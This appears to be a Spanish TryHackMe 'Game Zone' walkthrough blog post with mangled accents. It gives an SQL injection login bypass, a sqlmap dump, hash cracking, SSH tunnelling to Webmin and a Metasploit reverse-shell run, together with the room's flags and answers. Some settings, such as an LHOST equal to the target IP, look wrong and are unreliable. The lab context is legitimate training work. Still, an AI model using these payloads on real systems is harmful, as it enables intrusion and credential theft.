---
title: "Game Zone ‚Äî Recorrido por la sala TryHackMe"
description: "Game Zone es una interesante sala de TryHackMe con elementos de juego en la que aprender√°s a explotar una vulnerabilidad de inyecci√≥n SQL, descifrar un hash para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un pivoteo y escalar tus privilegios."
date: "2025-11-26"
published: true
tags: ["tryhackme", "pentesting", "writeup", "webmin", "sqli", "pivoting"]
readTime: "20 min"
---
## Introduccion

**Game Zone** es una interesante sala de TryHackMe con elementos de juego en la que aprender√°s a explotar una vulnerabilidad de **inyecci√≥n SQL**, **descifrar un hash** para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un **pivoteo** y escalar tus **privilegios**.

---

## ‚öôÔ∏è Configuraci√≥n

Agregamos la IP de la sala a nuestro archivo hosts sera nuestra maquina que corramos en ese instante de igual forma tryhackme es la que nos da la ip de la maquina que vamos a explotar:

```bash
echo "10.64.144.150 game-zone.tryhackme.com" >> /etc/hosts
```
Realizmos un ping a la sala para verificar que la IP se haya agregado correctamente:

```bash
ping game-zone.tryhackme.com
```

## Desplegar la m√°quina vulnerable

Para encontrar el nombre del avatar de dibujos animados en cuesti√≥n, podemos realizar una *b√∫squeda inversa* de im√°genes utilizando la b√∫squeda visual de google.

## üîé Escaneo Inicial con Nmap

Sigamos la metodolog√≠a de una prueba de penetraci√≥n real detectando primero los puertos abiertos cin sus respectivas versiones y luego intentando explotarlos.

```bash
nmap -sVC -p- -Pn -T5 --min-rate 25000 10.64.144.150
```

Despues del escaneo con nmap podemos ver que tiene el puerto 80 abierto corriendo un servidor web apache.

## ‚ö° Enumeraci√≥n de servicios y versiones.

**HTTP**

Echemos un vistazo r√°pido utilizando la extension de **wappalyzer** para identificar las tecnologias usadas y sus versiones o tambien podemos usar **whatweb -v <IP>** directamenta en la terminal y nos dara los mismos resultados que **wappalyzer**

Aqu√≠, **wappalyzer** nos proporcion√≥ informaci√≥n √∫til como la siguiente:

- El servidor web utilizado y su versi√≥n (Apache 2.4.18)
- El lenguaje de programaci√≥n de back-end (PHP)
- El sistema operativo utilizado por el servidor web (Ubuntu)
Con base en la informaci√≥n recopilada anteriormente, podemos realizar una investigaci√≥n de vulnerabilidades para comprobar si la versi√≥n del servidor Apache es vulnerable o no.

## Investigaci√≥n sobre vulnerabilidad

Aqu√≠ vamos a utilizar una herramienta llamada searchsploit :

 ```bash
 searchsploit apache 2.4
 ```

Lamentablemente, no se ha encontrado ninguna vulnerabilidad relacionada con la versi√≥n de Apache del objetivo.

Sin embargo, si presta atenci√≥n a la p√°gina web anterior, es posible que haya notado un formulario de inicio de sesi√≥n de usuario.

Aqu√≠ reside una posible vulnerabilidad, ya que se puede introducir el nombre de usuario como otra consulta SQL . Esto permitir√° escribir, insertar y ejecutar la consulta.

M√°s espec√≠ficamente, esta vulnerabilidad se denomina vulnerabilidad de inyecci√≥n SQL.

## Inyecci√≥n SQL

Encontramos un formulario de autenticaci√≥n b√°sico. Probamos inyecci√≥n SQL manual:

 ```bash
user: 'or 1=1--
password: <vac√≠o>
 ```

Como podemos ver, la inyecci√≥n SQL ha funcionado correctamente permitiendo el bypass de login. Ahora, necesitamos obtener acceso inicial al sistema objetivo.

## Pregunta 
When you've logged in, what page do you get redirected to?
**Respuesta: portal.php**

## üï∑Ô∏è Capturando Petici√≥n con Burp Suite

Antes de ejecutar automatizaci√≥n, interceptamos la solicitud POST para analizarla en detalle.

En Burp Suite:

- Activamos proxy

- Iniciamos sesi√≥n con el payload

- Guardamos la solicitud como responder.txt

## üíâ Explotaci√≥n Automatizada con SQLmap

Utilizamos SQLmap para explotar la inyecci√≥n SQL:

```bash
sqlmap -r responder.txt --dbms=mysql --dump
```
## Pregunta 

In the users table, what is the hashed password?

**Respuesta: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14**

What was the username associated with the hashed password?

**Respuesta: agent47**

What was the other table name?

**Respuesta: post**

El volcado muestra credenciales:

```bash
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

## üîì Cracking de Hash con John

Guardamos el hash en hash.txt y lo crackeamos con John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
## Pregunta 

What is the de-hashed password?

**Respuesta: videogamer124**

John nos muestra la contrase√±a:

```bash
videogamer124
```
What is the user flag?

**Respuesta: 649ac17b1480ac13ef1e4fa579dac95c**

## üßë‚Äçüíª Acceso por SSH

Con las credenciales v√°lidas:

```bash
ssh agent47@10.64.144.150
```

Una vez dentro, obtenemos la flag del usuario:

```bash
cat user.txt
```

## Enumeraci√≥n Interna del Sistema

Validamos servicios activos:

```bash
ss -tulpn
```

Detectamos que est√° escuchando Webmin en un puerto accesible solo localmente.

## Pregunta 

How many TCP sockets are running?

**Respuesta: 5**

What is the name of the exposed CMS?

**Respuesta: Webmin**  

What is the CMS version?

**Respuesta: 1.580**

## üîÅ T√∫nel SSH para Acceder a Webmin

Creamos un t√∫nel SSH de puerto local hacia la instancia remota:

```bash
ssh -L 10000:localhost:10000 agent47@10.64.144.150
```

Luego accedemos desde el navegador:

```bash
http://localhost:10000
```
## üí£ Explotaci√≥n de Webmin con Metasploit (versi√≥n 1.580)

Abrimos Metasploit:

```bash
msfconsole
```

Buscamos m√≥dulos vulnerables:

```bash
searchsploit webmin
```

Seleccionamos el exploit:

```bash
use exploit/unix/webapp/webmin_backdoor
```

Configuramos par√°metros:

```bash
set RHOST localhost
set LHOST 10.64.144.150
set USERNAME agent47
set PASSWORD videogamer124
set PAYLOAD cmd/unix/reverse
set SSL false
run
```

## Pregunta Final

What is the root flag?

**Respuesta: a4b945830144bdd71908d12d902adeee**

## üéâ Conclusi√≥n

La m√°quina Gamer Zone combina varios vectores importantes:

- Inyecci√≥n SQL cl√°sica

- Cracking de hashes

- Acceso SSH

- T√∫neles locales para acceder a servicios internos

- Explotaci√≥n de Webmin con Metasploit


Es un excelente laboratorio para perfeccionar t√©cnicas de acceso inicial y escalada de privilegios en entornos controlados.

